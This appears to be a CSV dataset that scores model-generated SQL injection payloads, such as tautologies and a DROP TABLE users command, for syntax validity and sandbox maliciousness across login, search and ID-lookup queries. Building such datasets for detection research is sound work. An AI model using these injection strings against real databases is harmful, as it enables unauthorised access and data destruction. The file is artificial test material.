id,seed_query,candidate_query,context,syntax_valid,sandbox_malicious,notes
1,' OR 'x'='x',SELECT * FROM users WHERE username = '' OR 'x'='x'' AND password = 'anything',login,false,false,attack_category=tautology; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
2,' OR 1=1 --,SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'anything',login,true,false,attack_category=tautology; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
3,'; DROP TABLE users;--,SELECT * FROM users WHERE username = ''; DROP TABLE users;--' AND password = 'anything',login,true,false,attack_category=tautology; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
4,' OR 1=1 --,SELECT * FROM products WHERE name LIKE '%' OR 1=1 --%',search,true,false,attack_category=tautology; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
5,; DROP TABLE IF EXISTS users;--,SELECT * FROM products WHERE name LIKE '%; DROP TABLE IF EXISTS users;--%',search,true,false,attack_category=tautology; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; not_effectively_malicious
6,/*'*/OR 1=1 /*'*/,SELECT * FROM products WHERE name LIKE '%/*'*/OR 1=1 /*'*/%',search,false,false,attack_category=tautology; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
7,1; --,SELECT * FROM users WHERE id = 1; --,id_lookup,true,true,attack_category=tautology; source=llm_generated; generator_model=gemini-3-flash-preview
8,1' AND '1'='1,SELECT * FROM users WHERE id = 1' AND '1'='1,id_lookup,false,false,attack_category=tautology; source=llm_generated; generator_model=gemini-3-flash-preview; parse_failed; not_effectively_malicious
9,SELECT * FROM users WHERE id = 1 OR (SELECT 1 FROM (SELECT 1)) --,SELECT * FROM users WHERE id = SELECT * FROM users WHERE id = 1 OR (SELECT 1 FROM (SELECT 1)) --,id_lookup,false,false,attack_category=tautology; source=llm_generated; generator_model=gemini-3-flash-preview; parse_failed; not_effectively_malicious
10,status = 'pending' OR 1=1 --,SELECT * FROM orders WHERE status = 'status = 'pending' OR 1=1 --' ORDER BY date DESC,product_filter,false,false,attack_category=tautology; source=llm_generated; generator_model=gemini-3-flash-preview; payload_inside_quotes_only; parse_failed; not_effectively_malicious
